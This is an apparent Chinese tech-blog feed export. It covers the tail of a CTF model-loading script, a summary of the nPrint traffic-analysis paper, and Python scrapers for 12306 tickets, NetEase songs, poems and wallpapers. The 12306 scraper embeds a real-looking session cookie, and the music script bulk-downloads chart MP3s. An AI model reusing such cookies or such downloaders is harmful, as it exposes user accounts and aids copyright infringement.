class="number">0</span>],pas[<span class="number">1</span>],pas[<span class="number">2</span>],pas[<span class="number">3</span>]))</span><br><span class="line"><span class="keyword">elif</span>(<span class="built_in">len</span>(pas)==<span class="number">2</span>):</span><br><span class="line">mylayers.append(np.array(mylayer).reshape(pas[<span class="number">0</span>],pas[<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">elif</span>(<span class="built_in">len</span>(pas)==<span class="number">1</span>):</span><br><span class="line">mylayers.append(np.array(mylayer))</span><br><span class="line"><span class="built_in">print</span>(mylayers[inde].shape)</span><br><span class="line">f.close()</span><br><span class="line">parameters = load_parameters()</span><br><span class="line">parameters = get_input_parameter_auto(parameters)</span><br><span class="line">model = aggregation(parameters)</span><br><span class="line">test(model)</span><br></pre></td></tr></table></figure><p>运行后结果如下：</p><p><img src="https://s2.loli.net/2022/04/20/nydkIf1mMFl3NQe.png" alt="3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF_Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> AI </tag>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
            <tag> 2022*CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Auto-Traffic-Analysis</title>
      <link href="/2022/04/06/Auto-Traffic-Analysis/"/>
      <url>/2022/04/06/Auto-Traffic-Analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="New-Directions-in-Automated-Traffic-Analysis论文学习"><a href="#New-Directions-in-Automated-Traffic-Analysis论文学习" class="headerlink" title="New Directions in Automated Traffic Analysis论文学习"></a>New Directions in Automated Traffic Analysis论文学习</h1><blockquote><p><strong>论文链接</strong>：<a href="https://dl.acm.org/doi/10.1145/3460120.3484758">New Directions in Automated Traffic Analysis | Proceedings of the 2021 ACM SIGSAC Conference on Computer and Communications Security</a></p></blockquote><h2 id="文章主要信息"><a href="#文章主要信息" class="headerlink" title="文章主要信息"></a>文章主要信息</h2><table><thead><tr><th>论文名称</th><th align="center">New Directions in Automated Traffic Analysis</th></tr></thead><tbody><tr><td>录用信息</td><td align="center">CCS 2021（CCF-A）</td></tr><tr><td>作者</td><td align="center"><a href="https://www.cs.princeton.edu/~jordanah/"> Jordan Holland</a>, Paul Schmitt, Nick Feamster, Prateek Mittal</td></tr><tr><td>论文链接</td><td align="center"><a href="https://dl.acm.org/doi/10.1145/3460120.3484758">https://dl.acm.org/doi/10.1145/3460120.3484758</a></td></tr><tr><td>源码</td><td align="center"><a href="https://github.com/nprint/nprint"> https://github.com/nprint/nprint</a></td></tr><tr><td>数据集</td><td align="center"><a href="https://drive.google.com/drive/folders/158Lwb9TwopIJ0lGPuFik5744qPiqrg9F">https://drive.google.com/drive/folders/158Lwb9TwopIJ0lGPuFik5744qPiqrg9F</a></td></tr></tbody></table><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>目前,机器学习技术被广泛应用于入侵检测、应用程序识别等网络流量分析任务中。但是，当我们使用机器学习方法时，特征提取、模型选择、参数调优等众多因素决定着模型的性能，每当面对不同的网络流量或新的任务，就需要研究人员重新考虑调整这些选项甚至重新建模，这个调整甚至是重建的过程往往需要大量人力成本和专业知识。并且，流量模式会不断的发生变化，使得模型和人工提取的特征过时。因此有必要为不同网络流量创建一个通用的表示，可以用于各种不同的模型，跨越广泛的问题类，并将整个建模过程自动化。该文关注通用的自动化网络流量分析问题，致力于使研究人员将更多的精力用于优化模型和特征上，并有更多的时间在实践中解释和部署最佳模型。</p><h2 id="自动化网络流量分析"><a href="#自动化网络流量分析" class="headerlink" title="自动化网络流量分析"></a>自动化网络流量分析</h2><p>本文提出一种自动化流量分析方法（nPrintML），使机器学习技术更容易应用于更广泛的流量分析任务。nPrintML 包含 nPrint 流量表示和 AutoML 两部分，首先 nPrint 通过对 IP 数据包头进行对齐和拼接形成统一的数据表征，然后使用 AutoGluon-Tabular 框架进行自动化的进行特征提取、模型搜索和超参数优化。作者在 8 个不同的流量分析任务上对 nPrintML 进行评估，都取得了很好的效果。</p><h2 id="数据表示-nPrint"><a href="#数据表示-nPrint" class="headerlink" title="数据表示 nPrint"></a>数据表示 nPrint</h2><p>对于流量分类问题，数据表示与模型选择同等重要，所以在应用机器学习方法时，如何对数据进行表示和编码是非常重要的一环。对于网络流量数据的编码需要满足以下4个要求：</p><ul><li>完整的表示。我们的目标不是选择特定的特征，而是一种统一的数据编码，以避免依赖专家知识，所以需要保留包含包头在内的所有数据包信息；</li><li>固定的大小。许多机器学习模型的输入总是保持相同的大小，所以每个数据包表示都必须是常量大小；</li><li>固有的规范化。当特征被归一化后，机器学习模型通常会表现得更好，也能减少训练时间并增加模型的稳定性，所以如果数据的初始表示本身就是规范化的，将会非常方便；</li><li>一致的表示。数据表示的每个位置都应该对应于所有数据包包头的相同部分，也就是说，即使协议和报文长度不同，特定的特征总是在数据包中具有相同的偏移量，对齐后的数据都能让模型基于这样的前提来学习特征表示。</li></ul><p>首先，来看一下传统的流量数据包头。</p><p><img src="https://s2.loli.net/2022/04/06/jIkEbltCHMYh9sR.png" alt="1.png"></p><p>​                                                      图1 语义表示法和朴素二进制表示法</p><p>如图1所示，网络流量表示的主要方式包括语义表示法和朴素二进制表示法。</p><ul><li>语义表示法：每个报头都有各自的语义字段，但它不保留具有区分度的可选字段的顺序，同时需要领域专业知识来解析每个协议的语义结构，即使拥有这些知识，后续也还是不可避免进行繁琐的特征工程；</li><li>朴素二进制表示法：使用数据包的原始位图表示来保持顺序，但是忽略了不同的大小和协议，导致两个数据包的特征向量对同一特征具有不同的含义，这种不对齐可能会在重要特征的地方引入噪声而降低模型性能，同时也因为无法将每一位都映射到语义上而导致不可解释。</li></ul><p>从图1中不难看出，不同的网络协议（如 TCP 和 UDP）有着不同的数据表示方案，甚至相同的网络协议（如 IP）也不相同（是否包含 Options 选项），这显然无法满足上述统一化数据表示的需求。因此，研究人员结合语义表示法和朴素二进制表示法提出一种统一的网络数据包表示方法<strong>nPrint</strong>（图 2）。</p><p><img src="https://s2.loli.net/2022/04/06/wqXfR7yOADHzLxQ.png" alt="2.png"></p><p>​                                                                                    图2 nPrint</p><p>nPrint 使用每种协议允许的最大包头长度来表示该协议，同时将不同协议头部拼接组合成固定长度的包头。首先，它会保证任何数据包都可以被完整表示而不丢失任何信息；然后，使用内部填充确保每个数据包以相同数量的特征表示，并且每个特征具有相同含义，这种在位级上可解释的表示使我们能够更好的理解模型；其次，直接使用数据包的位，区分于某个位被设置为0，将不存在的包头用-1填充；最后，每个数据包都用相同数量的特征表示，对于给定的网络流量分析任务，将载荷设置为可选的字节数。此外，nPrint具有模块化和可扩展的特性，不仅可以将其他协议添加到表示中，也可以将一组数据包表示串联起来构建多包的nPrint指纹。</p><p>因此，nPrint 符合了4大性质：</p><ul><li>完整性：理论上可以包含所有协议</li><li>不变性：数据表征可以是一个确定的长度</li><li>归一性：数据被表示为 1&#x2F;0&#x2F;-1</li><li>一致性：不同数据包头的同一选项在同一位置</li></ul><h2 id="nPrintML"><a href="#nPrintML" class="headerlink" title="nPrintML"></a>nPrintML</h2><p>作者将 nPrint 与 <a href="https://arxiv.org/abs/2003.06505">AutoGluon-Tabular</a> 框架相结合，提出 nPrintML，实现了实现了机器学习流程的自动化（如图3所示）。</p><p><img src="https://s2.loli.net/2022/04/06/BqpVTEaQ8eo3gY4.png" alt="3.png"></p><p>​                                                                             图3 nPrintML</p><blockquote><p>AutoGluon背后技术：<a href="https://www.bilibili.com/video/BV1F84y1F7Ps?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1F84y1F7Ps?spm_id_from=333.999.0.0</a></p><p>AutoGluon在Windows下安装：<a href="https://www.bilibili.com/video/BV1yL4y177hH/?spm_id_from=333.788">https://www.bilibili.com/video/BV1yL4y177hH/?spm_id_from=333.788</a></p><p>论文：<a href="https://arxiv.org/abs/2003.06505">https://arxiv.org/abs/2003.06505</a> </p><p>文档：<a href="https://auto.gluon.ai/">https://auto.gluon.ai/</a> </p><p>代码：<a href="https://github.com/awslabs/autogluon">https://github.com/awslabs/autogluon</a></p></blockquote><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><h3 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h3><p>针对8个网络流量分析场景，图4展示了用nPrintML进行分析的案例研究，实验结果表明，nPrintML不仅可以解决不同场景的网络流量分析问题，并且具有相较于传统方法更好的性能。</p><p><img src="https://s2.loli.net/2022/04/06/uA3FM5Z7yNBGqLm.png" alt="4.png"></p><p>​                                                                                  图4 实验结果总览</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>将机器学习应用于网络安全中的流量分析任务的有效性取决于特征的选择和适当的表示，即不超过模型本身。本文为自动流量分析创建了一个新方向，提出了 nPrint，这是一种统一的数据包表示，它将原始网络数据包作为输入，并将其转换为适合表示学习和模型训练的格式，从而使机器学习过程的一部分自动化到目前为止，这在很大程度上是艰苦的和手动的。这种标准格式可以轻松地将网络流量分析与最先进的自动机器学习 (AutoML) 管道集成。 nPrintML 是 nPrint 与 AutoML 的集成，可自动学习相应任务的最佳模型、参数设置和特征表示。本文作者们将 nPrintML 应用于八种常见的网络流量分析任务，在许多情况下改进了最新技术。 nPrint 已经证明，许多网络流量分类任务都可以自动化，尽管存在许多未解决的问题，例如涉及多个流的自动时间序列分析和分类。 nPrint 最终应该应用于更大的分类问题集。</p><h2 id="代码阅读及复现"><a href="#代码阅读及复现" class="headerlink" title="代码阅读及复现"></a>代码阅读及复现</h2><p>(过两天再做……)</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>[1] Nick Erickson, Jonas Mueller, Alexander Shirkov, Hang Zhang, Pedro Larroy, Mu Li, and Alexander Smola. 2020. AutoGluon-Tabular: Robust and Accurate AutoML for Structured Data. arXiv preprint arXiv:2003.06505 (2020).</p><p>[2] Holland J , Schmitt P , Feamster N , et al. New Directions in Automated Traffic Analysis. 2021 ACMComputer and Communications Security Conference [C]. 2021.</p><p>[3] <a href="https://blog.csdn.net/WellShark/article/details/122192656">https://blog.csdn.net/WellShark/article/details/122192656</a></p><p>[4] <a href="https://mp.weixin.qq.com/s/Y8UenzDHP2WjiL3GZ4OLJg">https://mp.weixin.qq.com/s/Y8UenzDHP2WjiL3GZ4OLJg</a></p>]]></content>
      
      
      <categories>
          
          <category> 论文学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 论文 </tag>
            
            <tag> 机器学习 </tag>
            
            <tag> 入侵检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫</title>
      <link href="/2022/04/06/python-crawler/"/>
      <url>/2022/04/06/python-crawler/</url>
      
        <content type="html"><![CDATA[<h3 id="Python爬虫学习"><a href="#Python爬虫学习" class="headerlink" title="Python爬虫学习"></a>Python爬虫学习</h3><p>整理了一下以前写过的一些小爬虫。</p><h4 id="12306查票"><a href="#12306查票" class="headerlink" title="12306查票"></a>12306查票</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 12306Check.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反复查询加循环即可</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;stations.json&#x27;</span>,mode=<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">text = f.read()</span><br><span class="line">city_json = json.loads(text)</span><br><span class="line">f.close()</span><br><span class="line">from_station = <span class="built_in">input</span>(<span class="string">&#x27;始发站：&#x27;</span>)</span><br><span class="line">to_station = <span class="built_in">input</span>(<span class="string">&#x27;终点站：&#x27;</span>)</span><br><span class="line">train_date = <span class="built_in">input</span>(<span class="string">&#x27;发车日期（格式：2022-04-03）：&#x27;</span>)</span><br><span class="line"><span class="comment"># from_station = &#x27;武汉&#x27;</span></span><br><span class="line"><span class="comment"># to_station = &#x27;长沙&#x27;</span></span><br><span class="line"><span class="comment"># train_date = &#x27;2022-04-06&#x27;</span></span><br><span class="line"><span class="comment"># print(city_json[from_station])</span></span><br><span class="line"><span class="comment"># print(city_json[to_station])</span></span><br><span class="line"><span class="comment"># print(train_date)</span></span><br><span class="line">url = <span class="string">&quot;https://kyfw.12306.cn/otn/leftTicket/query&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;leftTicketDTO.train_date&#x27;</span>: train_date,</span><br><span class="line"><span class="string">&#x27;leftTicketDTO.from_station&#x27;</span>: city_json[from_station],</span><br><span class="line"><span class="string">&#x27;leftTicketDTO.to_station&#x27;</span>: city_json[to_station],</span><br><span class="line"><span class="string">&#x27;purpose_codes&#x27;</span>: <span class="string">&#x27;ADULT&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers =&#123;</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;_uab_collina=164896135403377792450208; JSESSIONID=843F9AA2FC700ED2B8E8655CBA8E4AFD; BIGipServerotn=468713994.50210.0000; BIGipServerpool_passport=182714890.50215.0000; highContrastMode=defaltMode; guidesStatus=off; cursorStatus=off; RAIL_EXPIRATION=1649305414970; RAIL_DEVICEID=i7hoNlwMechBKbH0Ghsk6cswUh1nhyGKgfThBDYYiAGy_zBKBevr3wq6zqlS1GV-JvK0B-qVEYwihXSg-WVTUlOcG7NgUJc2INRx-UN6MMxdgg6sumeKjo2NXUwAOlNL7uSajwkmH4Aleee-puGjfAVFL2aVyYMY; route=9036359bb8a8a461c164a04f8f50b252; _jc_save_toStation=%u957F%u6C99%2CCSQ; _jc_save_fromDate=2022-04-03; _jc_save_toDate=2022-04-03; _jc_save_wfdc_flag=dc; _jc_save_fromStation=%u6B66%u6C49%2CWHN&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,params=data,headers=headers)</span><br><span class="line"><span class="comment"># &lt;Response [200]&gt; 获取响应体对象</span></span><br><span class="line"><span class="comment"># response.text 获取响应体的文本数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 乱码时可以使用以下方法</span></span><br><span class="line"><span class="comment"># response.encoding = &#x27;utf-8&#x27; #指定utf-8</span></span><br><span class="line">response.encoding = response.apparent_encoding <span class="comment">#自动转码</span></span><br><span class="line">result = response.json()[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;result&#x27;</span>]</span><br><span class="line">lis = []</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> result:</span><br><span class="line">index_list = index.replace(<span class="string">&#x27;有&#x27;</span>,<span class="string">&#x27;Yes&#x27;</span>).replace(<span class="string">&#x27;无&#x27;</span>,<span class="string">&#x27;No&#x27;</span>).split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line"><span class="comment"># index_list = index.split(&#x27;|&#x27;)</span></span><br><span class="line">TrainNum = index_list[<span class="number">3</span>]</span><br><span class="line">StartTime = index_list[<span class="number">8</span>]</span><br><span class="line">EndTime = index_list[<span class="number">9</span>]</span><br><span class="line">UseTime = index_list[<span class="number">10</span>]</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;G&#x27;</span> <span class="keyword">in</span> TrainNum):</span><br><span class="line">BussinessSeats = index_list[<span class="number">32</span>] <span class="comment">#商务座</span></span><br><span class="line">FirstSeats = index_list[<span class="number">31</span>] <span class="comment">#一等座</span></span><br><span class="line">SecondSeats = index_list[<span class="number">30</span>] <span class="comment">#二等座</span></span><br><span class="line">di = &#123;</span><br><span class="line"><span class="string">&#x27;Num&#x27;</span>: TrainNum,</span><br><span class="line"><span class="string">&#x27;Start&#x27;</span>: StartTime,</span><br><span class="line"><span class="string">&#x27;End&#x27;</span>: EndTime,</span><br><span class="line"><span class="string">&quot;Use&quot;</span>: UseTime,</span><br><span class="line"><span class="string">&quot;Top&quot;</span>: BussinessSeats,</span><br><span class="line"><span class="string">&quot;First&quot;</span>: FirstSeats,</span><br><span class="line"><span class="string">&quot;Second&quot;</span>: SecondSeats,</span><br><span class="line"><span class="string">&quot;Soft&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;HBed&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;HSeats&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;NSeats&quot;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">SoftBeds = index_list[<span class="number">23</span>] <span class="comment">#软卧</span></span><br><span class="line">HardBeds = index_list[<span class="number">28</span>] <span class="comment">#硬卧</span></span><br><span class="line">HardSeats = index_list[<span class="number">29</span>] <span class="comment">#硬座</span></span><br><span class="line">NoSeats = index_list[<span class="number">26</span>] <span class="comment">#无座</span></span><br><span class="line">di = &#123;</span><br><span class="line"><span class="string">&#x27;Num&#x27;</span>: TrainNum,</span><br><span class="line"><span class="string">&#x27;Start&#x27;</span>: StartTime,</span><br><span class="line"><span class="string">&#x27;End&#x27;</span>: EndTime,</span><br><span class="line"><span class="string">&quot;Use&quot;</span>: UseTime,</span><br><span class="line"><span class="string">&quot;Top&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;First&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;Second&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="string">&quot;Soft&quot;</span>: SoftBeds,</span><br><span class="line"><span class="string">&quot;HBed&quot;</span>: HardBeds,</span><br><span class="line"><span class="string">&quot;HSeats&quot;</span>: HardSeats,</span><br><span class="line"><span class="string">&quot;NSeats&quot;</span>: NoSeats</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># print(di)</span></span><br><span class="line">lis.append(di)</span><br><span class="line">pd.set_option(<span class="string">&#x27;display.max_rows&#x27;</span>,<span class="literal">None</span>) <span class="comment">#展示最大化，把所有行展示出来</span></span><br><span class="line">content = pd.DataFrame(lis)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/06/fDMaIr74u2E1OZn.png" alt="image-20220406083305519.png"></p><p>生成stations.json文件：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#get_station_code.py</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> RequestException</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getResponse</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">        response = requests.get(url,headers = headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> RequestException:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;https://kyfw.12306.cn/otn/resources/js/framework/station_name.js&quot;</span></span><br><span class="line">    data = getResponse(url)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        dict_data = &#123;&#125;</span><br><span class="line">        text = data.text</span><br><span class="line">        str_split = text.split(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> chars <span class="keyword">in</span> str_split[<span class="number">1</span>:]:</span><br><span class="line">            station = chars.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">            dict_data[station[<span class="number">1</span>]] = station[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;stations.json&quot;</span>,<span class="string">&#x27;w&#x27;</span>,encoding = <span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">            json.dump(dict_data,fp,ensure_ascii = <span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h4 id="网易云热歌爬取"><a href="#网易云热歌爬取" class="headerlink" title="网易云热歌爬取"></a>网易云热歌爬取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 163MusicGet.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|\✩\˚\*\•̩̩͙ʚ]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#各个符号间用转义字符隔开</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;music\\&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://music.163.com/discover/toplist?id=19723756&quot;</span> <span class="comment">#不同榜单切换该id即可</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,headers=headers)</span><br><span class="line">html_data = re.findall(<span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;/song\?id=(\d+)&quot;&gt;(.*?)&lt;/a&gt;&#x27;</span>,response.text) <span class="comment"># ？前面记得加个转义字符</span></span><br><span class="line"><span class="keyword">for</span> music_id,music_name <span class="keyword">in</span> html_data:</span><br><span class="line"><span class="comment"># 下载地址：https://music.163.com/song/media/outer/url?id=1933915376.mp3</span></span><br><span class="line">music_url = <span class="string">f&quot;https://music.163.com/song/media/outer/url?id=<span class="subst">&#123;music_id&#125;</span>.mp3&quot;</span></span><br><span class="line">music_content = requests.get(url=music_url,headers=headers).content</span><br><span class="line">music_name = change_name(music_name)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename + music_name +<span class="string">&#x27;.mp3&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(music_content)</span><br><span class="line"><span class="built_in">print</span>(music_id,music_name)</span><br></pre></td></tr></table></figure><p>MP3文件保存在music文件夹下：</p><p><img src="https://s2.loli.net/2022/04/06/u73hIWizV69jsMb.png" alt="image-20220406084013424.png"></p><h4 id="古诗词爬取"><a href="#古诗词爬取" class="headerlink" title="古诗词爬取"></a>古诗词爬取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PoetryGet.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.oh100.com/shici/1127009.html&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,headers=headers)</span><br><span class="line">response.encoding = response.apparent_encoding</span><br><span class="line">li = re.findall(<span class="string">&quot;\d+?、(.*?)&lt;/p&gt;&lt;p&gt;&quot;</span>,response.text)</span><br><span class="line">li[-<span class="number">1</span>] = re.sub(<span class="string">r&quot;&lt;/p&gt;&lt;script&gt;s\(\&quot;content_relate\&quot;\)\;\&lt;\/script\&gt;\&lt;p\&gt;\【形容洒脱的诗词\】相关文章\：&quot;</span>,<span class="string">&quot;&quot;</span>,li[-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> se <span class="keyword">in</span> li:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;- &quot;</span>+se)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/06/JXvfrT9FMqRDAPa.png" alt="image-20220406084235256.png"></p><h4 id="壁纸爬取"><a href="#壁纸爬取" class="headerlink" title="壁纸爬取"></a>壁纸爬取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># WallPaperGet.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">整体思路：</span></span><br><span class="line"><span class="string">1、访问网站查看信息（F12不可用可以先在别的网页打开再访问该网址）</span></span><br><span class="line"><span class="string">2、进入对应tag观察request的headers等信息（注意要点击加载更多后再看XHR下的文件）</span></span><br><span class="line"><span class="string">3、进入特定照片观察信息</span></span><br><span class="line"><span class="string">4、在text属性中获取title、img_url等信息</span></span><br><span class="line"><span class="string">5、在本地保存下来</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;img\\&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_title</span>(<span class="params">name</span>): <span class="comment">#重命名文件，防止原有保存文件名不合法</span></span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#各个符号间用转义字符隔开</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>): <span class="comment">#指定页数</span></span><br><span class="line">url = <span class="string">f&quot;https://m.bcoderss.com/tag/%e7%be%8e%e5%a5%b3/page/<span class="subst">&#123;page&#125;</span>/&quot;</span> <span class="comment"># %e7%be%8e%e5%a5%b3代表了美女这个标签，可以自行选择</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,headers=headers) <span class="comment">#该网站是个post请求但是不需要传params</span></span><br><span class="line"><span class="comment"># print(response.text)</span></span><br><span class="line">href = re.findall(<span class="string">&#x27;&lt;li&gt;&lt;a target=&quot;_blank&quot; href=&quot;(.*?)&quot;&#x27;</span>,response.text)[<span class="number">2</span>:] <span class="comment">#找到所有的照片初始地址，前两个是无用地址</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> href:</span><br><span class="line">response_1 = requests.get(url=index,headers=headers) <span class="comment">#访问照片初始地址</span></span><br><span class="line">title = re.findall(<span class="string">&quot;&lt;title&gt;(.*?)&lt;/title&gt;&quot;</span>,response_1.text)[<span class="number">0</span>] <span class="comment">#获取照片标题</span></span><br><span class="line">title = change_title(title)</span><br><span class="line">img_url = re.findall(<span class="string">&#x27;&lt;img alt=&quot;.*?&quot; title=&quot;.*?&quot; src=&quot;(.*?)&quot;&gt;&#x27;</span>,response_1.text)[<span class="number">0</span>] <span class="comment">#获取照片下载地址</span></span><br><span class="line">img_content = requests.get(url=img_url,headers=headers).content <span class="comment">#获取照片内容</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename + title + <span class="string">&#x27;.jpg&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f: <span class="comment">#保存照片</span></span><br><span class="line">f.write(img_content)</span><br><span class="line"><span class="built_in">print</span>(title,img_url)</span><br></pre></td></tr></table></figure><p>壁纸会保存在img文件夹下（图片不是很适合放出来，就放下文字吧…）</p><p><img src="https://s2.loli.net/2022/04/06/hgFZor87UKQkRjd.png" alt="image-20220406084429168.png"></p><h4 id="LOL英雄皮肤图片爬取"><a href="#LOL英雄皮肤图片爬取" class="headerlink" title="LOL英雄皮肤图片爬取"></a>LOL英雄皮肤图片爬取</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 